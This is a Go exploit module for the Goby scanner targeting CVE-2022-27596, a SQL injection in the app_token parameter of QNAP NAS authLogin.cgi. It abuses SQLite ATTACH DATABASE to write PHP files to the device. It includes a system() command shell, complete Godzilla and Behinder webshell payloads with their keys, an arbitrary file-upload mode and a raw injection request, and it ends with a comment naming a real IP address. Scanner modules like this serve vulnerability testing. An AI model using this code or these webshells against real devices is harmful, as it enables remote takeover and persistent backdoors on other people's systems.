package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "QNAP-NAS authLogin.cgi app_token RCE Vulnerability (CVE-2022-27596)",
    "Description": "<p>QNAP Systems QTS is an operating system used by China's QNAP Systems for entry-level to mid-level QNAP NAS.</p><p>There is a security vulnerability in QNAP Systems QTS. The vulnerability stems from the fact that devices running QuTS hero and QTS allow remote attackers to inject malicious code into the app_token parameter field to obtain server permissions.</p>",
    "Product": "QNAP-NAS",
    "Homepage": "https://www.qnap.com/",
    "DisclosureDate": "2022-03-21",
    "Author": "h1ei1",
    "FofaQuery": "(((header=\"http server\" && body=\"redirect_suffix\") || body=\"/css/qnap-default.css\" || body=\"/redirect.html?count=\\\"+Math.random()\" || body=\"/indexnas.cgi?counter=\") && body!=\"Server: couchdb\") || (body=\"qnap_hyperlink\" && body=\"QNAP Systems, Inc.</a> All Rights Reserved.\")",
    "GobyQuery": "(((header=\"http server\" && body=\"redirect_suffix\") || body=\"/css/qnap-default.css\" || body=\"/redirect.html?count=\\\"+Math.random()\" || body=\"/indexnas.cgi?counter=\") && body!=\"Server: couchdb\") || (body=\"qnap_hyperlink\" && body=\"QNAP Systems, Inc.</a> All Rights Reserved.\")",
    "Level": "3",
    "Impact": "<p>There is a security vulnerability in QNAP Systems QTS. The vulnerability stems from the fact that devices running QuTS hero and QTS allow remote attackers to inject malicious code into the app_token parameter field to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01\">https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webShell,custom,sqlPoint",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        },
        {
            "name": "webShell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webShell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc123.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo(md5(123)) ?>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "File Upload"
    ],
    "VulType": [
        "File Upload",
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-27596"
    ],
    "CNNVD": [
        "CNNVD-202301-2340"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "QNAP-NAS authLogin.cgi 文件 app_token 参数代码执行漏洞（CVE-2022-27596）",
            "Product": "QNAP-NAS",
            "Description": "<p>QNAP Systems QTS 是中国威联通科技（QNAP Systems）公司的一个入门到中阶QNAP NAS 使用的操作系统。<br></p><p>QNAP Systems QTS存在安全漏洞，该漏洞源于运行QuTS hero和QTS的设备允许远程攻击者在app_token参数字段注入恶意代码获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01\">https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01</a><br></p>",
            "Impact": "<p>QNAP Systems QTS存在安全漏洞，该漏洞源于运行QuTS hero和QTS的设备允许远程攻击者在app_token参数字段注入恶意代码获取服务器权限。<br></p>",
            "VulType": [
                "SQL注入",
                "文件上传"
            ],
            "Tags": [
                "SQL注入",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "QNAP-NAS authLogin.cgi app_token RCE Vulnerability (CVE-2022-27596)",
            "Product": "QNAP-NAS",
            "Description": "<p>QNAP Systems QTS is an operating system used by China's QNAP Systems for entry-level to mid-level QNAP NAS.<br></p><p>There is a security vulnerability in QNAP Systems QTS. The vulnerability stems from the fact that devices running QuTS hero and QTS allow remote attackers to inject malicious code into the app_token parameter field to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01\">https://www.qnap.com.cn/zh-cn/security-advisory/qsa-23-01</a><br></p>",
            "Impact": "<p>There is a security vulnerability in QNAP Systems QTS. The vulnerability stems from the fact that devices running QuTS hero and QTS allow remote attackers to inject malicious code into the app_token parameter field to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload",
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-20",
    "PocId": "10714"
}`
	httpGetRequest3689369369 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		configGet := httpclient.NewGetRequestConfig(uri)
		configGet.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0")
		return httpclient.DoHttpRequest(hostInfo, configGet)

	}
	urlEncode189273 := func(str string) string {
		str = strings.ReplaceAll(str, "+", "%2b")
		str = strings.ReplaceAll(str, "?", "%3f")
		str = strings.ReplaceAll(str, " ", "+")
		str = strings.ReplaceAll(str, ";", "%3b")
		str = strings.ReplaceAll(str, "\"", "'")
		str = strings.ReplaceAll(str, "&", "%26")
		return str

	}
	uploadShell58964638 := func(hostInfo *httpclient.FixUrl, filename, fileContent string) bool {
		uri := "/cgi-bin/authLogin.cgi"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = fmt.Sprintf("app=MUSIC_STATION&app_token=123';ATTACH+DATABASE+'/share/CACHEDEV1_DATA/.qpkg/musicstation/%s'+AS+qnapkey%%3bCREATE+TABLE+qnapkey.key+(dataz+text)%%3bINSERT+INTO+qnapkey.key+(dataz)+VALUES+(\"%s\")%%3b--&sid=1&client_app=1&client_agent=", filename, urlEncode189273(fileContent))
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil || resp.StatusCode != 200 {
			return false
		}
		return true
	}

	fileWriteFunction687636235 := func(hostInfo *httpclient.FixUrl, filename string) bool {
		fileContent := `<?php file_put_contents($_POST['filename'],base64_decode($_POST['fileContent'])); ?>`
		return uploadShell58964638(hostInfo, filename, fileContent)
	}

	fileWriteContent893693 := func(hostInfo *httpclient.FixUrl, tempFilename, filename, fileContent string) (*httpclient.HttpResponse, error) {
		configPost := httpclient.NewPostRequestConfig("/musicstation/" + tempFilename)
		configPost.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		configPost.Data = fmt.Sprintf("filename=%s&fileContent=%s", filename, base64.StdEncoding.EncodeToString([]byte(fileContent)))
		return httpclient.DoHttpRequest(hostInfo, configPost)
	}

	getExecuteResult1468787 := func(hostInfo *httpclient.FixUrl, filename string, cmd string) string {
		if len(cmd) > 0 {
			cmd = "?cmd=" + url.QueryEscape(cmd)
		}
		resp, err := httpGetRequest3689369369(hostInfo, fmt.Sprintf("/musicstation/%s%s", filename, cmd))
		if err != nil || resp.StatusCode != 200 {
			return ""
		}
		return resp.Utf8Html
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			fileName := goutils.RandomHexString(6) + ".php"
			randomStr := goutils.RandomHexString(6)
			if !uploadShell58964638(hostInfo, fileName, fmt.Sprintf("<?php echo(md5('%s'));bunlink(__FILE__); ?>", randomStr)) {
				return false
			}
			respHtml := getExecuteResult1468787(hostInfo, fileName, "")
			return strings.Contains(respHtml, fmt.Sprintf("%x", md5.Sum([]byte(randomStr))))
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["attackType"].(string) == "cmd" {
				fileName := goutils.RandomHexString(6) + ".php"
				if !uploadShell58964638(expResult.HostInfo, fileName, "markSpaceStart<?php system($_GET['cmd']); ?>markSpaceEnd") {
					return expResult
				}
				respHtml := getExecuteResult1468787(expResult.HostInfo, fileName, ss.Params["cmd"].(string))
				reg, _ := regexp.Compile(`markSpaceStart([\w\W]*?)markSpaceEnd`)
				results := reg.FindAllStringSubmatch(respHtml, -1)
				if len(results) > 0 && len(results[0]) > 1 {
					expResult.Output = results[0][1]
					expResult.Success = true
				}
			} else if ss.Params["attackType"].(string) == "webShell" {
				tempFilename := goutils.RandomHexString(6) + ".php"
				fileWriteFunction687636235(expResult.HostInfo, tempFilename) // 写入一个file_put_contents($_POST['filename'],base64_decode($_POST['fileContent'])
				filename := goutils.RandomHexString(6) + ".php"
				tool := ""
				password := ""
				fileContent := ""
				if ss.Params["webShell"].(string) == "godzilla" {
					tool = "Godzilla v4.1"
					password = "pass 加密器：PHP_XOR_BASE64"
					fileContent = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				} else if ss.Params["webShell"].(string) == "behinder" {
					tool = "Behinder v3.0"
					password = "rebeyond"
					fileContent = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				}

				resp, _ := fileWriteContent893693(expResult.HostInfo, tempFilename, filename, fileContent)
				if resp.StatusCode != 200 {
					return expResult
				}
				resp, _ = httpGetRequest3689369369(expResult.HostInfo, fmt.Sprintf("/musicstation/%s", filename))
				if resp.StatusCode != 200 {
					return expResult
				}
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/musicstation/%s", filename) + "\n"
				expResult.Output += "Password: " + password + "\n"
				expResult.Output += "WebShell tool: " + tool + "\n"
				expResult.Output += "Webshell type: php"
				if ss.Params["webShell"] == "custom" {
					expResult.Output = "File Upload Successful! \nURL: " + expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/musicstation/%s", filename)
				}
			} else if ss.Params["attackType"] == "custom" {
				tempFilename := goutils.RandomHexString(6) + ".php"
				fileWriteFunction687636235(expResult.HostInfo, tempFilename)
				fileContent := ss.Params["content"].(string)
				filename := ss.Params["filename"].(string)
				resp, _ := fileWriteContent893693(expResult.HostInfo, tempFilename, filename, fileContent)
				if resp.StatusCode != 200 {
					return expResult
				}
				resp, _ = httpGetRequest3689369369(expResult.HostInfo, fmt.Sprintf("/musicstation/%s", filename))
				if resp.StatusCode != 200 && resp.StatusCode != 500 {
					return expResult
				}
				expResult.Success = true
				expResult.Output = "File Upload Successful! \nURL: " + expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/musicstation/%s", filename)
			} else if ss.Params["attackType"] == "sqlPoint" {
				expResult.Output = `POST /cgi-bin/authLogin.cgi HTTP/2
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 241
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

app=MUSIC_STATION&app_token=123';ATTACH+DATABASE+'/share/CACHEDEV1_DATA/.qpkg/musicstation/b326Ec112.php'+AS+qnapkey%3bCREATE+TABLE+qnapkey.key+(dataz+text)%3bINSERT+INTO+qnapkey.key+(dataz)+VALUES+("YourFile")%3b--&sid=1&client_app=1&client_agent=`
				expResult.Success = true
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}

//https://73.255.98.240
